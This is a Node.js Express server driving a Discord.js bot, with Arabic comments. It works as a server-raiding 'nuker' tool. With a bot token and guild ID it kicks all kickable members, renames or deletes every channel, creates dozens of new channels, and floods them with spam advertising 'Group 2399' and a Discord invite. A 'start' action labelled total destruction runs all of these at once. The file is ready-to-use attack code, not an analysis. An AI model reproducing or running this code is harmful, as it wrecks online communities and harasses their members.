const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// تشغيل الواجهة
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    
    // تشغيل البوت بـ Intents كاملة
    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages, 
            GatewayIntentBits.MessageContent
        ] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);
        if (!guild) return res.status(404).send({ status: '❌ السيرفر غير موجود' });

        const name = customName || "Group 2399";
        const msg = customMsg || "# Group 2399 is here\nhttps://discord.gg/2399k";

        // تنفيذ الأوامر
        if (action === 'طرد الجميع') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
        }

        if (action === 'تغيير الأسماء') {
            guild.channels.cache.forEach(c => c.setName(name).catch(() => {}));
        }

        if (action === 'إنشاء رومات') {
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => {});
                }, i * 250);
            }
        }

        if (action === 'إرسال سبام') {
            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(ch => {
                for (let i = 0; i < 50; i++) {
                    setTimeout(() => ch.send(msg).catch(() => {}), i * 600);
                }
            });
        }

        if (action === 'ابدأ') {
            // التدمير الشامل
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText })
                    .then(ch => {
                        for(let j=0; j<30; j++) setTimeout(() => ch.send(msg).catch(() => {}), j * 700);
                    }).catch(() => {});
                }, i * 350);
            }
        }

        res.send({ status: `🚀 تم إطلاق [${action}] بنجاح!` });
    } catch (e) {
        res.status(500).send({ status: '❌ فشل: التوكن خطأ أو البوت يحتاج صلاحيات' });
    }
});

app.listen(process.env.PORT || 3000, () => console.log('Lord 2399 Online'));
